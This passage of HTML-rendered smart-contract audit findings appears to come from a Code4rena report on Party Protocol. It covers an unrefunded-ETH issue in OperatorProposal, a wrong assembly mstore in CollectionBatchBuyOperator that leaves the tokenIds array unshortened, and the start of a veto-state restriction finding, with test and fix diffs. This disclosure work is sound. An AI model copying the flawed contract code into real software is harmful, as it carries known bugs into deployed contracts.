1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>As mentioned before, this is only a fix for the case when <code>allowOperatorsToSpendPartyEth=false</code>.</p>\n<p>Fix:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/proposals/OperatorProposal.sol b/contracts/proposals/OperatorProposal.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 23e2897..507e0d5 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/proposals/OperatorProposal.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/proposals/OperatorProposal.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -4,7 +4,11 @@ pragma solidity 0.8.17;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import &quot;./IProposalExecutionEngine.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import &quot;../operators/IOperator.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+import &quot;../utils/LibAddress.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> contract OperatorProposal {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    using LibAddress for address payable;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     struct OperatorProposalData {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Addresses that are allowed to execute the proposal and decide what</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // calldata used by the operator proposal at the time of execution.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -41,9 +45,17 @@ contract OperatorProposal {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             revert NotEnoughEthError(data.operatorValue, msg.value);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 partyBalanceBefore = address(this).balance - msg.value;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Execute the operation.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         data.operator.execute{ value: data.operatorValue }(data.operatorData, executionData);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (!allowOperatorsToSpendPartyEth) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (address(this).balance - partyBalanceBefore &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                payable(msg.sender).transferEth(address(this).balance - partyBalanceBefore);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Nothing left to do.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         return &quot;&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/5#issuecomment-1509854381\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Looking forward to sponsor comment on this. As described in my comment on <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/30#issuecomment-1509847694\"><code>#30</code></a>, I am not entirely sure that this qualifies as Medium based on the fact that the caller presumably is able to call with the correct value. QA may be more appropriate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/5#issuecomment-1509855041\">HollaDieWaldfee (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@0xean - It is not true that the caller can just use the function with the correct value:</p>\n<blockquote>\n<p>“For example the <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L14-L224\">CollectionBatchBuyOperator</a> contract may not spend all of the ETH because the actual purchases that are made are not necessarily known at the time the proposal is created. Also not all purchases may succeed.”</p>\n</blockquote>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/5#issuecomment-1511998345\">0xble (Party) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>@HollaDieWaldfee is right, there is at least one case with the <code>CollectionBatchBuyOperator</code> where it may not use all the ETH and the user may expect to be refunded. I think marking as Medium is valid.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-11-collectionbatchbuyoperatorsol-tokenids-array-is-not-shortened-properly-which-makes-execute-function-revert-when-not-all-nfts-are-purchased-successfully\" style=\"position:relative;\"><a href=\"#m-11-collectionbatchbuyoperatorsol-tokenids-array-is-not-shortened-properly-which-makes-execute-function-revert-when-not-all-nfts-are-purchased-successfully\" aria-label=\"m 11 collectionbatchbuyoperatorsol tokenids array is not shortened properly which makes execute function revert when not all nfts are purchased successfully permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/4\">[M-11] <code>CollectionBatchBuyOperator.sol</code>: <code>tokenIds</code> array is not shortened properly which makes execute function revert when not all NFTs are purchased successfully</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/4\">HollaDieWaldfee</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/31\">hansfriese</a></em></p>\n<p>The <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L14-L224\"><code>CollectionBatchBuyOperator</code></a> contract allows parties to buy NFTs through proposals.</p>\n<p>The proposal specifies an <code>nftContract</code> and token IDs (via the <code>nftTokenIdsMerkleRoot</code> parameter) that can be bought.</p>\n<p>Allowed <code>executors</code> can then execute the actual purchase by executing the proposal and providing execution data.</p>\n<p>The execution data specifies which token IDs to buy, where to buy them from and the price to buy the tokens for.</p>\n<p>The <code>CollectionBatchBuyOperator.execute</code> function is supposed to succeed even when not all purchases are successful.</p>\n<p>This is achieved by skipping over failed purchases:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L132-L137\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Execute the call to buy the NFT.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">_buy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">call</span><span class=\"mtk1\">.</span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">callValue</span><span class=\"mtk1\">, </span><span class=\"mtk12\">call</span><span class=\"mtk1\">.</span><span class=\"mtk12\">data</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">success</span><span class=\"mtk1\">) </span><span class=\"mtk15\">continue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Later in the function the NFTs that have been bought are transferred to the party:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L186-L188\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">op</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nftContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>If at least one NFT purchase has failed, the <code>tokenIds</code> array is bigger than the amount of NFTs that has actually been purchased. In other words there are empty spots at the end of the <code>tokenIds</code> array, i.e. the value that is stored there is zero.</p>\n<p>Therefore, before transferring the NFTs, the <code>tokenIds</code> array needs to be shortened such that it is not attempted to transfer <code>tokenId=0</code>.</p>\n<p>The contract uses the following code to achieve this:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L180-L183\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Update length of `tokenIds`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">mstore</span><span class=\"mtk1\">(</span><span class=\"mtk11\">mload</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ex</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokensBought</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>This code is wrong as I will explain later.</p>\n<p>The impact of this is that when not all purchases are successful the function reverts because it attempts to transfer the <code>tokenId=0</code> (since there are empty spots in the <code>tokenIds</code> array and the array is not shortened).</p>\n<p>So the execution of the proposal will fail when it should actually succeed.</p>\n<h3 id=\"proof-of-concept-17\" style=\"position:relative;\"><a href=\"#proof-of-concept-17\" aria-label=\"proof of concept 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Let’s have a look again at the code to shorten the <code>tokenIds</code> array:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L180-L183\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Update length of `tokenIds`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">mstore</span><span class=\"mtk1\">(</span><span class=\"mtk11\">mload</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ex</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokensBought</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>It loads the first 32 bytes of <code>ex</code> from memory (<code>ex</code> is a <code>CollectionBatchBuyExecutionData</code> struct) and stores <code>tokensBought</code> in the memory location where the 32 bytes point to.</p>\n<p>This has nothing to do with shortening the <code>tokenIds</code> array.</p>\n<p>The correct code would be:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Update length of `tokenIds`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">mstore</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokensBought</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>This writes <code>tokensBought</code> to the first 32 bytes slot of the <code>tokenIds</code> array which is where the size of the array is stored.</p>\n<p>There exists a test case for this scenario in the <code>CollectionBatchBuyOperator.t.sol</code> test file. However the test contains an error which makes the test pass even though the <code>tokenIds</code> array is not shortened.</p>\n<p>Apply these changes to the test file:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/sol-tests/operators/CollectionBatchBuyOperator.t.sol b/sol-tests/operators/CollectionBatchBuyOperator.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 3956e84..a944c74 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/sol-tests/operators/CollectionBatchBuyOperator.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/sol-tests/operators/CollectionBatchBuyOperator.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -165,7 +165,7 @@ contract CollectionBatchBuyOperatorTest is Test, TestUtils, ERC721Receiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         bytes memory executionData = abi.encode(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             CollectionBatchBuyOperator.CollectionBatchBuyExecutionData({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 calls: calls,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                numOfTokens: 2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                numOfTokens: 3</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         );</span></span></span></code></pre>\n<p>Notice that when running the test (with the changes to the test file applied) it fails since the <code>tokenIds</code> array is not shortened properly.</p>\n<p>Then also apply the changes to the source file (shortening the array properly) and see that the test passes.</p>\n<h3 id=\"tools-used-10\" style=\"position:relative;\"><a href=\"#tools-used-10\" aria-label=\"tools used 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>As explained above, this is how to properly shorten the <code>tokenIds</code> array:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/operators/CollectionBatchBuyOperator.sol b/contracts/operators/CollectionBatchBuyOperator.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 4b1dcc9..fffa5e9 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/operators/CollectionBatchBuyOperator.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/operators/CollectionBatchBuyOperator.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -179,7 +179,7 @@ contract CollectionBatchBuyOperator is IOperator {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // Update length of `tokenIds`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            mstore(mload(ex), tokensBought)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            mstore(tokenIds, tokensBought)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/4#issuecomment-1512077491\">0xble (Party) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-12-vetoproposal-proposals-cannot-be-vetoed-in-all-states-in-which-it-should-be-possible-to-veto-proposals\" style=\"position:relative;\"><a href=\"#m-12-vetoproposal-proposals-cannot-be-vetoed-in-all-states-in-which-it-should-be-possible-to-veto-proposals\" aria-label=\"m 12 vetoproposal proposals cannot be vetoed in all states in which it should be possible to veto proposals permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/3\">[M-12] <code>VetoProposal</code>: proposals cannot be vetoed in all states in which it should be possible to veto proposals</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/3\">HollaDieWaldfee</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/20\">hansfriese</a></em></p>\n<p>The <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L8-L69\"><code>VetoProposal</code></a> contract allows to veto proposals with the <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L19-L60\"><code>voteToVeto</code></a> function.</p>\n<p>The proposal can only be vetoed when it is in the <code>Voting</code> state, otherwise the <code>voteToVeto</code> function reverts.</p>\n<p>The issue is that the <code>Voting</code> state is not the only state in which it should be possible to veto the proposal. It should also be possible to veto the proposal in the <code>Passed</code> and <code>Ready</code> states.</p>\n<p>(We can see this by looking at the downstream <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L617-L637\"><code>PartyGovernance.veto</code></a> function)</p>\n<p>It has been confirmed to me by the sponsor that the <code>voteToVeto</code> function should not restrict the situations in which vetos can occur.</p>\n<p>The impact of this issue is that the situations in which vetos can occur is more limited than it should be. Users should have the ability to veto proposals even in the <code>Passed</code> and <code>Ready</code> states but they don’t.</p>\n<h3 id=\"proof-of-concept-18\" style=\"position:relative;\"><a href=\"#proof-of-concept-18\" aria-label=\"proof of concept 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>By looking at the <code>VetoProposal.voteToVeto</code> function we see that it’s only possible to call the function when the proposal is in the <code>Voting</code> state. Otherwise the function reverts:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L28-L34\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Check that proposal is active</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">PartyGovernance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ProposalStatus</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalStatus</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">PartyGovernance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ProposalStateValues</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalValues</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) = </span><span class=\"mtk12\">party</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getProposalStateInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposalStatus</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">PartyGovernance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ProposalStatus</span><span class=\"mtk1\">.</span><span 